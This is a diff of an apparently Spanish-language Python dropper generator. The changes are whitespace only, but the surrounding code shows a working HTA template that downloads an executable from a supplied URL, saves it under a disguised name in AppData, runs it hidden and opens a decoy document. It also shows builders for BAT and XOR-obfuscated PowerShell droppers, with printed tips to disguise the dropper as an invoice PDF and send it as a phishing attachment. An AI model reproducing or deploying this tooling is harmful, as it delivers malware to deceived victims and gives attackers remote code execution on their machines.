@@ -87,7 +87,7 @@ HTA_TEMPLATE = '''<!DOCTYPE html>
 <html>
 <head>
 <title>Cargando documento...</title>
-<HTA:APPLICATION 
+<HTA:APPLICATION
     APPLICATIONNAME="DocumentViewer"
     BORDER="none"
     CAPTION="no"
@@ -135,14 +135,14 @@ Sub Window_OnLoad
     ' Descargar y ejecutar payload
     Set objShell = CreateObject("WScript.Shell")
     Set objHTTP = CreateObject("Microsoft.XMLHTTP")
-    
+
     ' Download payload
     payloadURL = "{payload_url}"
     savePath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\\Microsoft\\Windows\\Caches\\{random_name}.exe"
-    
+
     objHTTP.Open "GET", payloadURL, False
     objHTTP.Send
-    
+
     If objHTTP.Status = 200 Then
         Set objStream = CreateObject("ADODB.Stream")
         objStream.Type = 1
@@ -150,14 +150,14 @@ Sub Window_OnLoad
         objStream.Write objHTTP.ResponseBody
         objStream.SaveToFile savePath, 2
         objStream.Close
-        
+
         ' Ejecutar payload
         objShell.Run savePath, 0, False
     End If
-    
+
     ' Abrir documento decoy
     objShell.Run "{decoy_url}", 1, False
-    
+
     ' Cerrar HTA
     Window.Close
 End Sub
@@ -179,18 +179,18 @@ def build_bat_dropper(agent_path, output_path, payload_url, decoy_name=None):
     """Genera dropper BAT"""
     if decoy_name is None:
         decoy_name = f"documento_{generate_random_name()}.pdf"
-    
+
     random_name = f"WmiPrvSE_{generate_random_name()}"
-    
+
     dropper_code = BAT_TEMPLATE.format(
         payload_url=payload_url,
         random_name=random_name,
         decoy_name=decoy_name
     )
-    
+
     with open(output_path, 'w') as f:
         f.write(dropper_code)
-    
+
     print(f"[+] Dropper BAT generado: {output_path}")
     print(f"[*] Renombrar a algo convincente, ejemplo: 'Factura_2024.pdf.bat'")
 
@@ -198,42 +198,42 @@ def build_ps1_dropper(agent_path, output_path, decoy_url, xor_key=None):
     """Genera dropper PowerShell"""
     if xor_key is None:
         xor_key = generate_random_name(16)
-    
+
     # Leer y encriptar payload
     with open(agent_path, 'rb') as f:
         payload_bytes = f.read()
-    
+
     encrypted = xor_encrypt(payload_bytes, xor_key)
     payload_b64 = base64.b64encode(encrypted).decode()
-    
+
     random_name = f"conhost_{generate_random_name()}"
-    
+
     dropper_code = PS1_TEMPLATE.format(
         payload_b64=payload_b64,
         decoy_url=decoy_url,
         xor_key=xor_key,
         random_name=random_name
     )
-    
+
     with open(output_path, 'w') as f:
         f.write(dropper_code)
-    
+
     print(f"[+] Dropper PowerShell generado: {output_path}")
     print(f"[*] XOR Key: {xor_key}")
 
 def build_hta_dropper(agent_path, output_path, payload_url, decoy_url):
     """Genera dropper HTA"""
     random_name = f"msedge_{generate_random_name()}"
-    
+
     dropper_code = HTA_TEMPLATE.format(
         payload_url=payload_url,
         decoy_url=decoy_url,
         random_name=random_name
     )
-    
+
     with open(output_path, 'w') as f:
         f.write(dropper_code)
-    
+
     print(f"[+] Dropper HTA generado: {output_path}")
     print(f"[*] Usar en phishing emails como adjunto")
 
@@ -245,34 +245,34 @@ def main():
     parser.add_argument('--url', help='URL donde hostear el payload (para BAT/HTA)')
     parser.add_argument('--decoy', help='URL o archivo del documento decoy')
     parser.add_argument('--key', help='Clave XOR para encripción (solo PS1)')
-    
+
     args = parser.parse_args()
-    
+
     if not os.path.exists(args.agent):
         print(f"[!] Error: No se encontró {args.agent}")
         sys.exit(1)
-    
+
     print(f"[*] Generando dropper tipo: {args.type}")
     print(f"[*] Payload: {args.agent}")
     print(f"[*] Output: {args.output}")
-    
+
     if args.type == 'bat':
         if not args.url:
             print("[!] Error: --url requerido para BAT dropper")
             sys.exit(1)
         build_bat_dropper(args.agent, args.output, args.url, args.decoy)
-    
+
     elif args.type == 'ps1':
         decoy_url = args.decoy or "https://www.google.com"
         build_ps1_dropper(args.agent, args.output, decoy_url, args.key)
-    
+
     elif args.type == 'hta':
         if not args.url:
             print("[!] Error: --url requerido para HTA dropper")
             sys.exit(1)
         decoy_url = args.decoy or "https://www.google.com"
         build_hta_dropper(args.agent, args.output, args.url, decoy_url)
-    
+
     print("\n[*] Próximos pasos:")
     print("    1. Hostear el agent.exe en servidor web")
     print("    2. Renombrar dropper a nombre convincente")
